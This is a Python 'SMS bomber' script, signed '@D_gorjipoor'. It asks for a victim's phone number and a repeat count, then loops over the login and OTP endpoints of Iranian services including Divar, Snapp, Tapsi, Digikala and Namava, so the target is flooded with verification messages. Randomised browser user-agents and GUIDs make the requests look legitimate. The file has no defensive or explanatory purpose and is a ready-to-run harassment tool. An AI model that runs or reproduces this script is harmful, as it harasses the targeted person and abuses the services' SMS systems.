from colorama import Fore
import pyfiglet
import requests
from time import sleep
import random
from requests import post, get
from os import name, system
from time import sleep
import datetime
from colorama import init, Fore
import sys
import datetime
import time


heads = [
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3',
        'accept': 'application/json, text/plain, */*'
    },
    {
        'user-agent': 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4',
        'accept': 'application/json, text/plain, */*'
    },
]

guid = [
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC2",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC6",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC5",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC1",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC4",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC7",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC8",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC9",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC0",
    "2ECFC916-8F2D-5AA6-6993-BA562A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA662A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA462A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA962A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA262A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA162A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA362A0AEDC3",
    "2ECFC916-8F2D-5AA6-6993-BA062A0AEDC3",
    "2ECFC916-8F2D-5AA6-6913-BA362A0AEDC3",
    "2ECFC916-8F2D-5AA6-6963-BA362A0AEDC3",
    "2ECFC916-8F2D-5AA6-6973-BA362A0AEDC3",
    "2ECFC916-8F2D-5AA6-6913-BA362A0AEDC3",
    "2ECFC916-8F2D-5AA6-6983-BA362A0AEDC3",
]


def divar_bomber(number):
    divar_api = 'https://api.divar.ir/v5/auth/authenticate'
    json_request_api = {"phone": number}
    try:
        req = requests.post(divar_api, json=json_request_api,
                            headers=random_choose)
        print('divar Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def tapsi_bomber(number):
    tapsi_api = 'https://tap33.me/api/v2/user'
    json_request_api = {"credential": {
        "phoneNumber": number, "role": "DRIVER"}}
    try:
        req = requests.post(tapsi_api, json=json_request_api,
                            headers=random_choose)
        print('tapsi Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def snap_bomber(number):
    snap_api = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    json_request_api = {"cellphone": number}
    try:
        req = requests.post(snap_api, json=json_request_api,
                            headers=random_choose)
        print('snap Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def sheypoor_bomber(number):
    sheypoor_api = 'https://www.sheypoor.com/api/v10.0.0/auth/send'
    json_request_api = {"username": number}
    try:
        req = requests.post(
            sheypoor_api, json=json_request_api, headers=random_choose)
        print('sheypoor Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def apikala_bomber(number):
    apikala_api = 'https://apikala.ir/api/v2/sendverificationCode'
    json_request_api = {"mobile": number}
    try:
        req = requests.post(
            apikala_api, json=json_request_api, headers=random_choose)
        print('apikala Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def digikala_bomber(number):
    digikala_api = 'https://api.digikala.com/v1/user/authenticate/'
    json_request_api = {"backUrl": "/",
                        "username": number, "otp_call": "false"}
    try:
        req = requests.post(
            digikala_api, json=json_request_api, headers=random_choose)
        print('digikala Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def namava_bomber(number):
    namava_api = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
    json_namava = {"UserName": number}
    try:
        req = requests.post(namava_api, json=json_namava,
                            headers=random_choose)
        print('namava Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def filimo_bomber(number):
    filimo_api = 'https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1'
    json_filimo = {"account": number, "temp_id": id_, "guid": rg}
    try:
        req = requests.post(filimo_api, json=json_filimo,
                            headers=random_choose)
        print('filimo Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def basalam_bomber(number):
    basalam_api = 'https://auth.basalam.com/otp-request'
    json_basalam = {"mobile": number, "client_id": 11}
    try:
        req = requests.post(basalam_api, json=json_basalam,
                            headers=random_choose)
        print('basalam Code Sent!')
        print(req.status_code)
    except:
        print('error!')


def emtiaz_bomber(number):
    emtiaz_api = 'https://api.zarinplus.com/user/zarinpal-login'
    json_emtiaz = {"phone_number": number, "source": "zarinplus"}
    try:
        req = requests.post(emtiaz_api, json=json_emtiaz,
                            headers=random_choose)
        print('emtiaz Code Sent!')
        print(req.status_code)
    except:
        print('error!')


dat = (datetime.datetime.today())

print(Fore.GREEN, dat)

print(Fore.BLUE+pyfiglet.figlet_format('    Dani'))


banner = (Fore.CYAN+"""                        @D_gorjipoor""")
for bnr in banner:
    sys.stdout.write(bnr)
    sys.stdout.flush()
    time.sleep(0.1)
print("")
print("")
Rubik = (Fore.BLACK+"                   0ur telegram channel: @D_gorjipoor")
for Ru in Rubik:
    sys.stdout.write(Ru)
    sys.stdout.flush()
    time.sleep(0.1)
print("")
Rubi = ("                 0ur telegram channel: @D_gorjipoor")
for ru in Rubi:
    sys.stdout.write(ru)
    sys.stdout.flush()
    time.sleep(0.1)
print("")
print("")
sleep(3)

random_choose = random.choice(heads)
rg = random.choice(guid)
id_ = random.randint(111111, 999999)
# print(id_)
# print(rg)
number = input(Fore.GREEN+'[+] Enter Victim Number(with 0) ->')
user_input_loop = int(
    input("[+] How many times you want to send messages? -> "))

for i in range(user_input_loop):
    divar_bomber(number)
    sleep(2)
    tapsi_bomber(number)
    sleep(2)
    snap_bomber(number)
    sleep(2)
    sheypoor_bomber(number)
    sleep(2)
    # apikala_bomber(number)
    # sleep(2)
    digikala_bomber(number)
    sleep(2)
    # filimo_bomber(number)
    # sleep(2)
    emtiaz_bomber(number)
    sleep(2)
    basalam_bomber(number)
    sleep(2)
    namava_bomber(number)
    sleep(3)

print(Fore.GREEN, dat)
print(Fore.RED+"                    @D_gorjipoor")
print(Fore.RED+"@D_gorjipoor")
sleep(4)
